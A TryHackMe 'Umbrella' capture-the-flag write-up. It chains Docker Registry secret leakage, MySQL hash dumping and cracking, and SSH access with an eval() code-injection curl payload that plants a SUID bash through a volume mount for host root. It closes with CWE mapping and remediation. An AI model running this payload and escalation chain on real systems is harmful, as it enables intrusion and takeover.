# TryHackMe — Umbrella

> **Hack the time-tracking server at Umbrella Corp by exploiting containerization misconfigurations.**

| Info | Detail |
|------|--------|
| **Platform** | [TryHackMe](https://tryhackme.com) |
| **Room** | Umbrella |
| **Difficulty** | Medium |
| **Category** | Boot2Root, Containerization |
| **Key Topics** | Docker Registry enumeration, hardcoded credentials, eval() code injection, Docker volume escape |

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
  - [Port Scanning](#port-scanning)
  - [Service Enumeration](#service-enumeration)
- [Stage 1 — Docker Registry Secrets Leak](#stage-1--docker-registry-secrets-leak)
- [Stage 2 — MySQL Credential Extraction](#stage-2--mysql-credential-extraction)
- [Stage 3 — Hash Cracking & Initial Access (SSH)](#stage-3--hash-cracking--initial-access-ssh)
- [Stage 4 — Source Code Analysis](#stage-4--source-code-analysis)
- [Stage 5 — Container Escape via eval() + Volume Mount](#stage-5--container-escape-via-eval--volume-mount)
- [Full Attack Chain Summary](#full-attack-chain-summary)
- [Vulnerabilities & CWE Mapping](#vulnerabilities--cwe-mapping)
- [Remediation](#remediation)
- [Lessons Learned](#lessons-learned)

---

## Reconnaissance

### Port Scanning

```bash
nmap -p- umbrella.thm
```

Four open ports discovered:

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu |
| 3306 | MySQL   | MySQL 5.7.40 |
| 5000 | HTTP    | Docker Registry (API: 2.0) |
| 8080 | HTTP    | Node.js (Express middleware) |

```bash
nmap -sCV -O -p 22,3306,5000,8080 umbrella.thm
```

Key observations from the detailed scan:
- **MySQL 5.7.40** exposed externally with `mysql_native_password` authentication — unusual for a production deployment.
- **Port 5000** identified as **Docker Registry API 2.0** — a private container image registry.
- **Port 8080** runs **Node.js/Express** and serves a login page (`<title>Login</title>`).
- Express session cookie: `connect.sid` (HttpOnly, not Secure).

### Service Enumeration

Directory brute-forcing on `:8080` with `feroxbuster` found only `/css/` — a minimal frontend with a login form (`POST /auth`). The login page takes `username` and `password` fields.

Port 80 (default HTTP) is not open, and `feroxbuster` against `:3306` correctly failed since MySQL is not an HTTP service.

---

## Stage 1 — Docker Registry Secrets Leak

The Docker Registry on port 5000 is the primary attack surface. The room description explicitly hints at "containerization misconfigurations," and an unauthenticated Docker Registry is a classic misconfiguration that enables full image layer enumeration.

### Enumerating the Registry

```bash
# List all repositories
curl -s http://umbrella.thm:5000/v2/_catalog
```
```json
{"repositories":["umbrella/timetracking"]}
```

```bash
# List tags for the discovered repository
curl -s http://umbrella.thm:5000/v2/umbrella/timetracking/tags/list
```
```json
{"name":"umbrella/timetracking","tags":["latest"]}
```

```bash
# Pull the full manifest (contains build history with ENV variables)
curl -s http://umbrella.thm:5000/v2/umbrella/timetracking/manifests/latest
```

### What the Manifest Revealed

The manifest uses **Schema v1**, which includes a `history` array containing full `v1Compatibility` JSON for every image layer. Inside the top layer's config, environment variables are stored in plaintext:

```
"Env": [
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "NODE_VERSION=19.3.0",
    "YARN_VERSION=1.22.19",
    "DB_HOST=db",
    "DB_USER=root",
    "DB_PASS=Ng1-f3!Pe7-e5?Nf3****",
    "DB_DATABASE=timetracking",
    "LOG_FILE=/logs/tt.log"
]
```

> **Database password:** `Ng1-f3!Pe7-e5?Nf3****`

The Dockerfile history also reveals:
- Base image: Debian with Node.js 19.3.0
- Working directory: `/usr/src/app`
- Application files copied via `COPY` instructions (app.js, views/, public/)
- Entrypoint: `node app.js` on port 8080

**Vulnerability:** Hardcoded credentials in Docker image ENV variables (CWE-798) combined with unauthenticated Docker Registry access. Anyone who can reach port 5000 gets database root credentials.

---

## Stage 2 — MySQL Credential Extraction

With the leaked database credentials, we connected directly to the exposed MySQL service:

```bash
mysql -h umbrella.thm -u root -p'Ng1-f3!Pe7-e5?Nf3****' timetracking -e "SHOW TABLES;"
```
```
+------------------------+
| Tables_in_timetracking |
+------------------------+
| users                  |
+------------------------+
```

```bash
mysql -h umbrella.thm -u root -p'Ng1-f3!Pe7-e5?Nf3****' timetracking -e "SELECT * FROM users;"
```
```
+----------+----------------------------------+-------+
| user     | pass                             | time  |
+----------+----------------------------------+-------+
| claire-r | 2ac9cb7dc02b3c0083eb70898e549b63 |   360 |
| chris-r  | 0d107d09f5bbe40cade3de5c71e9e9b7 |   420 |
| jill-v   | d5c0607301ad5d5c1528962a83992ac8 |   564 |
| barry-b  | 4a04890400b5d7bac101baace5d7e994 | 47893 |
+----------+----------------------------------+-------+
```

Key observations:
- Passwords stored as **unsalted MD5 hashes** (32 hex characters) — the weakest form of password storage.
- Four users — names are Resident Evil characters (Umbrella Corp theme): Claire Redfield, Chris Redfield, Jill Valentine, Barry Burton.
- `barry-b` has an anomalous `time` value (47893 vs 360–564 for others).

---

## Stage 3 — Hash Cracking & Initial Access (SSH)

### Cracking MD5 Hashes

Unsalted MD5 hashes are trivially cracked via rainbow tables or dictionary attacks:

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

| User | Hash | Password |
|------|------|----------|
| claire-r | `2ac9cb...549b63` | `Pass****1` |
| chris-r | `0d107d...e9e9b7` | `let****` |
| jill-v | `d5c060...992ac8` | `sun****1` |
| barry-b | `4a0489...7e994` | `sand****` |

All four cracked instantly — every password is in the rockyou.txt top 10,000.

### Credential Reuse — SSH Access

Testing each credential pair against SSH:

```bash
ssh claire-r@umbrella.thm   # ✅ Access granted
ssh chris-r@umbrella.thm    # ❌ Permission denied
ssh jill-v@umbrella.thm     # ❌ Permission denied
ssh barry-b@umbrella.thm    # ❌ Permission denied
```

Only `claire-r` has an SSH account on the host. The other three users exist only within the containerized application.

### User Flag

```bash
claire-r@umbrella:~$ cat user.txt
THM{d832c0e4cf7131270868****}
```

Also noted in the home directory: `timeTracker-src/` — the full application source code, including Docker configuration files.

---

## Stage 4 — Source Code Analysis

### docker-compose.yml

```yaml
version: '3.3'
services:
  db:
    image: mysql:5.7
    restart: always
    environment:
      MYSQL_DATABASE: 'timetracking'
      MYSQL_ROOT_PASSWORD: 'Ng1-f3!Pe7-e5?Nf3****'
    ports:
      - '3306:3306'
    volumes:
      - ./db:/docker-entrypoint-initdb.d
  app:
    image: umbrella/timetracking:latest
    restart: always
    ports:
      - '8080:8080'
    volumes:
      - ./logs:/logs
```

Critical finding — the `app` service volume mount:
```yaml
volumes:
  - ./logs:/logs
```
This binds the **host directory** `~/timeTracker-src/logs/` to `/logs/` **inside the container**. It is a bidirectional mount: any file written to `/logs/` inside the container appears on the host filesystem, and vice versa.

### app.js — The eval() Vulnerability

```javascript
// POST /time endpoint
app.post('/time', function(request, response) {
    if (request.session.loggedin && request.session.username) {
        let timeCalc = parseInt(eval(request.body.time));  // ← VULNERABLE
        let time = isNaN(timeCalc) ? 0 : timeCalc;
        let username = request.session.username;

        connection.query("UPDATE users SET time = time + ? WHERE user = ?",
            [time, username], function(error, results, fields) {
            // ...
        });
    }
});
```

The `eval()` function executes **arbitrary JavaScript code** passed through the `time` POST parameter. Although `parseInt()` wraps the result, `eval()` executes first — any side effects (file operations, command execution) happen before the integer conversion.

The "Pro Tip" on the web page — *"You can also use mathematical expressions, e.g. `5+4`"* — is the application's way of explaining why `eval()` is used, but it creates a full **Server-Side JavaScript Injection (CWE-94)** vulnerability.

### Log File Ownership

```bash
claire-r@umbrella:~/timeTracker-src$ ls -la logs/
-rw-r--r-- 1 root root 190 Aug 24 08:40 tt.log
```

The log file is owned by `root:root` — confirming the container process runs as root. Any files created via the volume mount from inside the container will be owned by root on the host.

---

## Stage 5 — Container Escape via eval() + Volume Mount

This is the privilege escalation step, combining two vulnerabilities that individually seem limited but together provide a full container-to-host root escape.

### The Concept

```
┌──────────────── CONTAINER (root) ────────────────┐
│  eval() executes:                                 │
│  cp /bin/bash /logs/bash && chmod u+s /logs/bash  │
│                    │                              │
│              writes to /logs/                     │
└────────────────────┼──────────────────────────────┘
                     │  volume mount: ./logs ↔ /logs
┌────────────────────┼──────── HOST ────────────────┐
│  ~/timeTracker-src/logs/bash                      │
│  -rwsr-xr-x root root  ← SUID bit set            │
│                                                   │
│  claire-r runs: ./logs/bash -p                    │
│  → euid=0(root) → full root access                │
└───────────────────────────────────────────────────┘
```

### Step 1 — Deliver the Payload via eval()

Log into the web application on `:8080` as `barry-b` (or any valid user). Then send the payload through the time field:

```bash
curl -s -X POST \
  -b 'connect.sid=<session_cookie>' \
  -d "time=require('child_process').execSync('cp /bin/bash /logs/bash && chmod u+s /logs/bash')" \
  http://umbrella.thm:8080/time
```

What this does inside the container:
1. `require('child_process')` — loads Node.js child process module
2. `.execSync(...)` — executes a shell command synchronously
3. `cp /bin/bash /logs/bash` — copies the bash binary to the shared volume
4. `chmod u+s /logs/bash` — sets the **SUID bit**, meaning anyone who runs this binary gets root's effective UID

### Step 2 — Execute the SUID Binary on the Host

From the SSH session as `claire-r`:

```bash
claire-r@umbrella:~$ ls -la ~/timeTracker-src/logs/
-rwsr-xr-x 1 root root 1234376 Aug 24 08:40 bash    # ← SUID, owned by root
-rw-r--r-- 1 root root     222 Aug 24 08:40 tt.log

claire-r@umbrella:~$ ~/timeTracker-src/logs/bash -p
```

The `-p` flag tells bash **not to drop privileges** (by default, bash drops euid back to uid for security — `-p` preserves the SUID escalation).

```bash
bash-5.1# id
uid=1001(claire-r) gid=1001(claire-r) euid=0(root) groups=1001(claire-r)
```

**euid=0(root)** — effective root achieved.

### Root Flag

```bash
bash-5.1# cat /root/root.txt
THM{1e15fbe7978061c6bb19****}
```

---

## Full Attack Chain Summary

```
Docker Registry :5000 (unauthenticated)
    │  GET /v2/_catalog → umbrella/timetracking
    │  GET /v2/.../manifests/latest → ENV with DB_PASS in cleartext
    ▼
MySQL :3306 (exposed, root access)
    │  SELECT * FROM users → 4 users with unsalted MD5 hashes
    │  hashcat -m 0 → all 4 passwords cracked (rockyou.txt)
    ▼
SSH :22 (claire-r:Password1 — credential reuse)
    │  user.txt ✓
    │  Source code: app.js + docker-compose.yml
    ▼
Express :8080 (barry-b:sandwich)
    │  POST /time → eval(user_input) = RCE inside container
    │  Payload: cp /bin/bash /logs/bash && chmod u+s
    ▼
Volume Mount (host:./logs ↔ container:/logs)
    │  SUID bash binary appears on host, owned by root
    ▼
Host: bash -p → euid=0(root) → root.txt ✓
```

---

## Vulnerabilities & CWE Mapping

| # | Vulnerability | CWE | Impact |
|---|--------------|-----|--------|
| 1 | Unauthenticated Docker Registry | CWE-306 (Missing Authentication) | Full image enumeration, secret extraction |
| 2 | Hardcoded credentials in Docker ENV | CWE-798 (Use of Hard-coded Credentials) | Database root access |
| 3 | MySQL exposed externally | CWE-668 (Exposure of Resource to Wrong Sphere) | Direct database access from network |
| 4 | Unsalted MD5 password hashing | CWE-328 (Use of Weak Hash) | Instant password recovery |
| 5 | eval() on user input | CWE-94 (Code Injection) | Remote Code Execution in container |
| 6 | Unsafe Docker volume mount + root container | CWE-269 (Improper Privilege Management) | Container-to-host privilege escalation |

---

## Remediation

1. **Docker Registry** — Enable authentication (htpasswd, token-based, or TLS client certs). Never expose a registry without access control.
2. **Secrets Management** — Use Docker Secrets, environment variable injection at runtime (not build-time ENV), or an external vault (HashiCorp Vault, AWS Secrets Manager).
3. **MySQL** — Do not expose port 3306 externally. Restrict to container network only (`expose` instead of `ports`).
4. **Password Storage** — Replace MD5 with bcrypt/scrypt/argon2 with per-user salts.
5. **Input Handling** — Replace `eval()` with a safe math parser library (e.g., `mathjs`). Never use `eval()` on user input.
6. **Container Security** — Run containers as non-root (`USER node` in Dockerfile). Restrict volume mounts to read-only where possible (`:ro`). Use `--security-opt=no-new-privileges`.

---

## Lessons Learned

- **Docker Registry enumeration** is an underrated attack surface. The Schema v1 manifest format exposes the complete build history including every ENV instruction — treat it as a full credential leak vector.
- **Secrets in ENV are visible to anyone with image access.** Docker's layer model means that even if you delete a secret in a later layer, it persists in the earlier layer's blob. Build-time secrets require multi-stage builds and careful handling.
- **eval() + volume mount = container escape.** Neither vulnerability alone grants host root — eval() only gives RCE inside the container, and the volume mount only shares a directory. Combined, they create a privilege escalation path through SUID binary injection.
- **The `-p` flag on bash** is critical for SUID exploitation. Without it, bash drops the effective UID as a security measure. This is a small but essential detail that makes the difference between `uid=1001` and `euid=0`.
- **Credential reuse** remains one of the most reliable lateral movement techniques. The same password used in one service (MySQL/web app) often works for SSH or other services.
